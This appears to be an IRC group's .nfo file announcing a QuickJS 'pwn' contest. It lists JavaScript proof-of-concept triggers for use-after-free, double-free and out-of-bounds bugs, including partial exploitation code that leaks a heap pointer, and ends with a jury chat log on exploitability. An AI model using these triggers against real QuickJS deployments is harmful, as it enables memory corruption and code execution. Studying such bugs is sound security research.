+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⠿⠟⠛⠛⠉⣁⣀⣠⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠘⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⠻⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⢻⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠈⣿⣿⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢹⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀⠀⣀⣀⣤⣤⣶⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣫⣥⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣦⣤⣤⣀⠀⠀⠀⠀⠠⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣤⣈⣉⡻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡤⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠀⠀⠀⠀⠀⠀          ⠀⠀⠀ CracksByKim IRC is proud to announce: ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       _     _      __ _____    ___   _                        _           _   
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ___ _ _|_|___| |_ __|  |   __|  |   |_| |___ _ _    ___ ___ ___| |_ ___ ___| |_ 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀| . | | | |  _| '_|  |  |__   |  | | | . | .'| | |  |  _| . |   |  _| -_|_ -|  _|
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⠀⠀⠀ |_  |___|_|___|_,_|_____|_____|  |___|___|__,|_  |  |___|___|_|_|_| |___|___|_|  
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀  |_|                                        |___|                               
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<Foreword by ~as>
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Congratulations to all that entered the crackbykim irc challenge for quickjs. 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Seeing the cracksbykim irc come together to compete to pwn quickjs has been absolutely wonderful. 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀No matter who is selected to win today, everyone who entered should feel proud with what they achieved.
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Hacking a javascript engine is no easy task, and being able to do so within the time constraints that were provided are extremely impressive. 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀But of course, there can only be one who gets the prize. 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀The two categories for the competition are best bug, and best exploitation technique. 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Entries are be graded on reliability, cross-platform support, and cleverness. 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀The winner of each category will receive a prize of $500. without further adieu, here
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀are the constestants for the competition.
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Submissions for the bug category (in chronological order of hash proof / submission):
+
+
+By @qwertyoruiopz - methodology: audit (note, not actually a qualifying submission for the contest, but added for completion):
+
+	// bug class: double release uaf
+	let spray = new Array(100);
+	let a = [{hack:0},1,2,3,4];
+	let refcopy = [a[0]];
+	a.__defineSetter__(3,()=>{throw 1;});
+	try {
+		a.sort(function(v){if (v == a[0]) return 0; return 1;});
+	}
+	catch (e){}
+	a[0] = 0;
+	for (let i=0; i<1000; i++) spray[i] = [13371337];
+	console.log(refcopy[0]);
+
+By @xyz - methodology: trying stuff I would imagine (not actually an exploitable submission):
+
+	let a=[];
+	a.push(a);
+	a.toString();
+
+By @itszn13 - methodology: audit:
+
+	// bug class: uaf
+	function hack(size, action, start, end) {
+	    // Allocate a backing array for given size
+	    let t = new Array(size/0x10|0);
+	    t.fill(1);
+	
+	    t.constructor = {[Symbol.species]: function () {
+	        let evil = new Proxy({}, {
+	            defineProperty(x, key, desc) {
+	                if (key === '0')
+	                    // Free array ptr
+	                    t[1000] = 1;
+	                action(key, desc);
+	                return true;
+	            }
+	        });
+	        return evil;
+	    }};
+	    let o = t.slice(start, end);
+	}
+	
+	// Used later for better fake_obj/addr_of later on
+	let real_jsvalue_array = [1];
+	let real_binary_buffer = new ArrayBuffer(16);
+	
+	let confused_obj;
+	let prop_arr_leak;
+	
+	// Our goal is to use the UAF to leak the address of a property array
+	// then we can use this to fake an object
+	hack(0x48, function(key, desc) {
+	    print("-------"+key);
+	    if (key === '0') {
+	        // Allocate object in UAF memory
+	        confused_obj = {
+	            a:1,
+	            b:2
+	        };
+	        //debug(confused_obj);
+	    } else if (key === '1') {
+	        // Now we read the property array pointer from confused object
+	        prop_arr_leak = desc.value;
+	        print("!!! Prop_arr = 0x"+ prop_arr_leak.toString(16));
+	        //cc();
+	    }
+	}, 1, 3);
+	
+By @mxms - methodology: ran wk LayoutTests on qjs:
+
+	function* foo(a) {
+	    yield () => arguments;
+	}
+	
+	foo(10).next().value()[0];
+
+By @niklasb - methodology: fuzzing:
+
+	// weakmap cyclic reference double free
+	function f() {
+	    var map = new WeakMap();
+	    var x = { map };
+	    map.set(x, map);
+	    () => x.map;
+	}
+	f();
+
+By @niklasb - methodology: fuzzing:
+
+	// JSObject double free - (possibly dup? maybe RCA required to evaluate)
+	function f() {
+	    var str = new String("1337");
+	
+	    var obj = new Int8Array(1337);
+	    obj.toString = () => str;
+	
+	    var str2 = str;
+	    var obj2 = {};
+	    str2 = str2 + obj;
+	}
+	f();
+
+By @niklasb - methodology: auditing (collision with @itszn13 and in fact, Bellard himself - although @itszn13's submission is the first one in chronological order, so this is not a qualifying submission):
+
+	// js_array_slice side effect leads to OOB (and Bellard knew it!!!)
+	let size = 1000;
+	let offset = 900;
+	
+	let spray = [];
+	
+	let sideeffect = () => {
+	    ary.length = 0;
+	    for (let i = size - 10; i < size; ++i) {
+	        ary[i] = 1337;
+	    }
+	}
+	
+	function Foo() {
+	    return new Proxy({}, {
+	        // This will be triggered by the loop in js_array_slice:
+	        //
+	        // /* Special case fast arrays */
+	        // if (js_get_fast_array(ctx, obj, &arrp, &count32)) {
+	        //     /* XXX: should share code with fast array constructor */
+	        //     /* XXX: this may crash if the new array has a custom property
+	        //     handler that modifies the original array */
+	        //     for (; k < final && k < count32; k++, n++) {
+	        //         if (JS_CreateDataPropertyUint32(ctx, arr, n, JS_DupValue(ctx, arrp[k]), JS_PROP_THROW) < 0)
+        	//             goto exception;
+        	//     }
+        	// }
+        	//
+        	// in later iterations, arrp[k] will be out of bounds.
+        	defineProperty: function (obj, key, val) {
+        	    if (key == 0) {
+        	        console.log('sneaking a side effect');
+        	        sideeffect();
+        	    }
+        	    Object.defineProperty(obj, key, val);
+        	    return true;
+        	},
+	    });
+	}
+	
+	class MyArray extends Array {
+	  static get [Symbol.species]() { return Foo; }
+	}
+	
+	let ary = new MyArray(size).fill(42);
+	let foo = ary.slice(offset, size);
+	print(foo[1]);
+
+By @mxms - methodology: ran wk LayoutTests on qjs (not a qualifying submission, as this was added post-mortem):
+
+	(function() {'use strict'; let f1; function f1(a) {};})()
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<~qwertyoruiop>
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀The jury was handed this .nfo file up until this point in order to evaluate the submissions.
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀It shall be noted that mxms has not submitted the source for his precommitted bug yet.
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Jury IRC logs provided:
+
+[22:22:04]  bkth:	Btw I am totally corruptible 
+[22:23:31]  ~as:	ima try stability tests
+[22:24:45]  ~as:	but for bug collisions should exploitation techniques be taken into account?
+[22:25:38]  @qwertyoruiop:	as, we had initially said we'd pick whoever precommitted first to one
+[22:25:43]  ~as:	ah right
+[22:27:15]  littlelailo:	I tend to vote for niklasb's bug because it's a double free and you normally don't see them in js engines while there were a few cases where raw pointers where cached in local vars and then updated in jsc that lead the bugs. On the other hand double frees normally trigger an assertion in malloc... so idk if they are exploitable
+[22:27:34]  @qwertyoruiop:	by double free, i think he means double release
+[22:28:00]  @qwertyoruiop:	but yeah, reentrance-and-reallocate-backing bugs are more common across engines
+[22:28:05]  bkth:	Thanks littlelailo 
+[22:28:08]  @qwertyoruiop:	as usually the backing is held as a raw pointer
+[22:28:12]  niklasb:	ok my comment on this is: this is double release on function exit, so presumable object can be reclaimed and then freed, which would lead to arbitrary type confusion, but I have not verified this
+[22:30:33]  ~as:	hm niklasb when i run your second one with asan i get a heap uaf 
+[22:30:40]  niklasb:	yeah on release
+[22:30:44]  ~as:	ah right
+[22:30:50]  Fire30:	yeah the JSObject one will be easy to exploit
+[22:31:25]  littlelailo:	ok so niklasb's bugs are (prob) exploitable?
